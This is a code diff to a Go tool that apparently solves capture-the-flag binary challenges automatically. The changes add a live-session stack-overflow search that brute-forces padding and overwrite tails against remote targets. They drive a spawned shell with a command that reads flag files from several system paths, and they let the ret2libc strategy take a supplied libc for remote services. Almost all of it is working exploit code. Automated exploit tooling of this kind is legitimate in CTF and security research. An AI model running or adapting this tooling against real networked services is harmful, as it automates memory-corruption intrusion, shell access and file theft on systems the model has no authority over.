@@ -24,8 +24,10 @@ import (
 
 // driveShell is sent to the spawned shell after the overflow line. The labs make
 // stdin unbuffered, so the vulnerable read consumes only its line and leaves this
-// for the shell. A remote service may read the flag from a different path.
-const driveShell = "cat flag.txt\n"
+// for the shell. It tries the common flag locations so the same command works for
+// a local lab (flag.txt beside the binary) and a remote challenge (flag in the
+// working directory or the user's home).
+const driveShell = "cat flag flag.txt ./flag ./flag.txt /flag /flag.txt 2>/dev/null; cat /home/*/flag 2>/dev/null\n"
 
 // execveBinSh is a null-tolerant, newline-free x86-64 execve("/bin/sh",
 // ["/bin/sh"], NULL). gets() stops only at a newline, so embedded NUL bytes are
@@ -108,13 +110,20 @@ func (s *solver) liveAttempt(ctx context.Context, strategy string, build func(le
 	if !ok {
 		return false, nil
 	}
-	input := append(append(append([]byte{}, payload...), '\n'), []byte(driveShell)...)
-	if err := conn.Send(input); err != nil {
-		return false, nil // target closed; treat as a failed attempt, not a solve error
+	// Send the exploit line first and let any spawned shell come up, then send
+	// the flag command as a separate write. Appending it to the same line would
+	// be swallowed by the target's own stdin buffering (read-ahead) before the
+	// shell inherits the descriptor; a later write reaches the shell's raw reads.
+	line := append(append([]byte{}, payload...), '\n')
+	if err := conn.Send(line); err != nil {
+		return false, nil // target closed; a failed attempt, not a solve error
 	}
+	mid := conn.RecvUntilIdle(s.idle())
+	_ = conn.Send([]byte(driveShell))
 	post := conn.RecvUntilIdle(s.idle())
-	out := string(pre) + string(post)
+	out := string(pre) + string(mid) + string(post)
 
+	input := append(line, []byte(driveShell)...)
 	cands := s.ex.Find(out, input, "session")
 	recovered := extract.Recovered(cands)
 	a := Attempt{
@@ -132,6 +141,59 @@ func (s *solver) liveAttempt(ctx context.Context, strategy string, build func(le
 		winner := a
 		s.report.Winning = &winner
 		return true, nil
+	}
+	return false, nil
+}
+
+// maxSessionOverwrite bounds the session-based overflow search, where each
+// attempt is a full connection and is therefore far more costly than a one-shot
+// run.
+const maxSessionOverwrite = 700
+
+// stackOverwriteSessionStrategy is the overflow search over a live session: it
+// solves a target whose win is a spawned shell (for example system("/bin/sh")
+// after a guard variable is overwritten), which one-shot execution cannot drive.
+// The magic-constant candidates are tried before the return-address ones, so a
+// variable-overwrite target is reached quickly, and the spawned shell is driven
+// by liveAttempt's trailing command. It also solves flag-printing wins, since the
+// printed flag is extracted the same way.
+func (s *solver) stackOverwriteSessionStrategy(ctx context.Context) (bool, error) {
+	funcTails, magicTails, err := overwriteTails(s.path, s.report.Binary)
+	if err != nil {
+		return false, err
+	}
+	if len(funcTails)+len(magicTails) == 0 {
+		return false, nil
+	}
+	attempts := 0
+	for _, phase := range [][]tail{magicTails, funcTails} {
+		for _, pad := range paddingLengths() {
+			for _, t := range phase {
+				if err := ctx.Err(); err != nil {
+					return false, err
+				}
+				if attempts >= maxSessionOverwrite {
+					s.report.Limitations = append(s.report.Limitations, fmt.Sprintf("session overflow search stopped at the %d-attempt cap", maxSessionOverwrite))
+					return false, nil
+				}
+				attempts++
+				tb := t
+				done, err := s.liveAttempt(ctx, "stack_overwrite", func(leaks []uint64) ([]byte, string, bool) {
+					payload := make([]byte, 0, pad+len(tb.bytes))
+					for i := 0; i < pad; i++ {
+						payload = append(payload, 'A')
+					}
+					payload = append(payload, tb.bytes...)
+					if bytes.IndexByte(payload, '\n') >= 0 {
+						return nil, "", false
+					}
+					return payload, fmt.Sprintf("padding=%d tail=%s", pad, tb.note), true
+				})
+				if err != nil || done {
+					return done, err
+				}
+			}
+		}
 	}
 	return false, nil
 }
@@ -211,9 +273,9 @@ func (s *solver) ret2libcStrategy(ctx context.Context) (bool, error) {
 	if !okRDI {
 		return false, nil
 	}
-	sysOff, binshOff, ok := resolveLibc(s.path)
+	sysOff, binshOff, ok := resolveLibc(s.path, s.libc)
 	if !ok {
-		s.report.Limitations = append(s.report.Limitations, "could not resolve libc system()/\"/bin/sh\"; ret2libc strategy skipped (remote targets may use a different libc)")
+		s.report.Limitations = append(s.report.Limitations, "could not resolve libc system()/\"/bin/sh\"; ret2libc strategy skipped (for a remote target with a different libc, pass --libc)")
 		return false, nil
 	}
 	for _, off := range leakOffsets() {
@@ -257,18 +319,23 @@ func (s *solver) ret2libcStrategy(ctx context.Context) (bool, error) {
 	return false, nil
 }
 
-// resolveLibc finds the libc the target links, then returns the file offset of
-// system() and of a "/bin/sh" string within it.
-func resolveLibc(path string) (sysOff, binshOff uint64, ok bool) {
-	out, err := exec.Command("ldd", path).Output()
-	if err != nil {
-		return 0, 0, false
+// resolveLibc returns the file offset of system() and of a "/bin/sh" string in
+// the target's libc. When libcPath is set it is used directly (for a remote
+// target whose libc differs from this machine's); otherwise the libc the local
+// binary links is found with ldd.
+func resolveLibc(path, libcPath string) (sysOff, binshOff uint64, ok bool) {
+	if libcPath == "" {
+		out, err := exec.Command("ldd", path).Output()
+		if err != nil {
+			return 0, 0, false
+		}
+		m := regexp.MustCompile(`(/[^\s]*libc[^\s]*\.so[^\s]*)`).FindSubmatch(out)
+		if m == nil {
+			return 0, 0, false
+		}
+		libcPath = string(m[1])
 	}
-	m := regexp.MustCompile(`(/[^\s]*libc[^\s]*\.so[^\s]*)`).FindSubmatch(out)
-	if m == nil {
-		return 0, 0, false
-	}
-	lf, err := elf.Open(string(m[1]))
+	lf, err := elf.Open(libcPath)
 	if err != nil {
 		return 0, 0, false
 	}
